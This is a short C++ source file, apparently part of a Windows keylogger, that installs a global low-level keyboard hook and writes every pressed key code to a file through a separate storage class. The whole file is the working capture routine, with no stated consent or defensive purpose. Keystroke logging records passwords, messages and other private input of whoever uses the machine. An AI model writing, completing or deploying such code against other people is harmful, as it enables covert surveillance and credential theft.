/*
 * keyPress.cpp
 *
 *  Created on: Dec 7, 2017
 *      Author: julio.andrade
 */

#include "keyPress.h"
#include "..\FileSave\store.h"
#include <Windows.h>
 store *keyPress::saveFile;
 HHOOK keyPress::_hook;



void keyPress::Start() {
	keyPress::saveFile=new store();

	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, &HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}

}
LRESULT __stdcall keyPress::HookCallback(int nCode, WPARAM wParam, LPARAM lParam){
	 KBDLLHOOKSTRUCT kbdStruct;
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			keyPress::saveFile->Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);

}
void keyPress::unlock() {
	UnhookWindowsHookEx(_hook);
}

